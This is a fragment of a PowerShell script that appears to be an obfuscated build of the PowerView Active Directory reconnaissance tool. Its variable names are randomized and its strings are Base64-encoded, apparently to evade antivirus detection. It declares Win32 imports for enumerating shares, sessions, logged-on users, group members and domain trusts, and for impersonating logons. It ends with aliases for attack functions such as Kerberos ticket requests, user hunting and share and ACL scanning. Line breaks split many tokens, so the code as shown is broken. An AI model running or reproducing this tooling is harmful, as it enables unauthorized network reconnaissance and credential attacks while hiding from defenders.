SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    
SidTypeComputer         = 9
}
${ea327b0784a642188789c5e39aed4e7d} = 
struct ${3afa1c61a8e041b1ab54c406175658af} LOCALGROUP_INFO_1 @{
    
lgrpi1_name = field 0 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    lgrpi1_comment = field 1 String -
MarshalAs @($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${c3e5754901224ca98efa148d6a7452bc} = struct 
${3afa1c61a8e041b1ab54c406175658af} LOCALGROUP_MEMBERS_INFO_2 @{
    
lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 
${4d7585e5ad8744299564635d9f0eba1a}
    lgrmi2_domainandname = field 
2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${39cb5444b42d478c8ae8aee3b1734fb1} = psenum 
${3afa1c61a8e041b1ab54c406175658af} DsDomain.Flags UInt32 @{
    
IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    
PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} 
-Bitfield
${4b8dbb177b5b4c1fb963b03a8af52130} = psenum 
${3afa1c61a8e041b1ab54c406175658af} DsDomain.TrustType UInt32 @{
    
DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         
= 4
}
${8d9f3ca00b964695be708b727a02a228} = psenum 
${3afa1c61a8e041b1ab54c406175658af} DsDomain.TrustAttributes UInt32 
@{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    
FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    
CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    
TREAT_AS_EXTERNAL   = 64
}
${45f560d8fa2c44118cc0339c2d7596e3} = 
struct ${3afa1c61a8e041b1ab54c406175658af} DS_DOMAIN_TRUSTS @{
    
NetbiosDomainName = field 0 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    DnsDomainName = field 1 String -MarshalAs 
@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    Flags = field 2 
${39cb5444b42d478c8ae8aee3b1734fb1}
    ParentIndex = field 3 UInt32
  
  TrustType = field 4 ${4b8dbb177b5b4c1fb963b03a8af52130}
    
TrustAttributes = field 5 ${8d9f3ca00b964695be708b727a02a228}
    
DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
${e91984bc5d314d8c973be942a7b53561} = struct 
${3afa1c61a8e041b1ab54c406175658af} NETRESOURCEW @{
    dwScope =     
    field 0 UInt32
    dwType =          field 1 UInt32
    
dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 
UInt32
    lpLocalName =     field 4 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    lpRemoteName =    field 5 String -
MarshalAs @($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpComment =   
    field 6 String -MarshalAs @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABQAFcAUwB0AHIA'))))
    lpProvider =      field 7 String -
MarshalAs @($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${be850ee7c49f47949509bc8a6184efa1} = @(
    (func netapi32 
NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), 
[Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), 
[Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum 
([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], 
[Int32].MakeByRefType(), [Int32].MakeByRefType(), 
[Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) 
@([String], [String], [String], [Int], [IntPtr].MakeByRefType(), 
[Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), 
[Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum 
([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], 
[Int32].MakeByRefType(), [Int32].MakeByRefType(), 
[Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers 
([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), 
[Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), 
[Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) 
@([String], [IntPtr].MakeByRefType())),
    (func netapi32 
DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], 
[IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func 
netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 
ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) 
-SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @
([String], [String], [Int]) -SetLastError),
    (func advapi32 
CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser 
([Bool]) @([String], [String], [String], [UInt32], [UInt32], 
[IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 
ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    
(func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func 
wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 
WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), 
[Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -
SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) 
@([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), 
[Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 
WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func 
wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 
WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr 
WNetAddConnection2W ([Int]) @(${e91984bc5d314d8c973be942a7b53561}, 
[String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 
([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle 
([Bool]) @([IntPtr]) -SetLastError)
)
${547bb417f3324a00a76f8424e6421ef0} = 
${be850ee7c49f47949509bc8a6184efa1} | Add-Win32Type -Module 
${3afa1c61a8e041b1ab54c406175658af} -Namespace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBpAG4AMwAyAA==')))
${b65b271ff93e4a76a0ec16347a31f911} = 
${547bb417f3324a00a76f8424e6421ef0}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bgBlAHQAYQBwAGkAMwAyAA==')))]
${d8402eaefa6844d19815430c6481b92a} = 
${547bb417f3324a00a76f8424e6421ef0}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBkAHYAYQBwAGkAMwAyAA==')))]
${7755ea9f5656424eb57373227129eabc} = 
${547bb417f3324a00a76f8424e6421ef0}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dwB0AHMAYQBwAGkAMwAyAA==')))]
${da7bc368a7eb43eca4577fdffe587212} = 
${547bb417f3324a00a76f8424e6421ef0}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBwAHIA')))]
${69b57a8d9aba46bbb3891217dde2b445} = 
${547bb417f3324a00a76f8424e6421ef0}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('awBlAHIAbgBlAGwAMwAyAA==')))]
Set-Alias Get-IPAddress Resolve-
IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias 
Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-
DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias 
Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias 
Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-
ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-
DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias 
Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-
DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias 
Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-
InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias 
Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias 
Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-
DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-
DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-
DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-
DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias 
Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-
GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias 
Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-
CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-
NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias 
Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-
CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-
RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess 
Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-
ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-
EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-
DomainShare
Set-Alias Invoke-FileFinder Find-
InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin 
Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-
DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias 
Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup 
Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-
DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
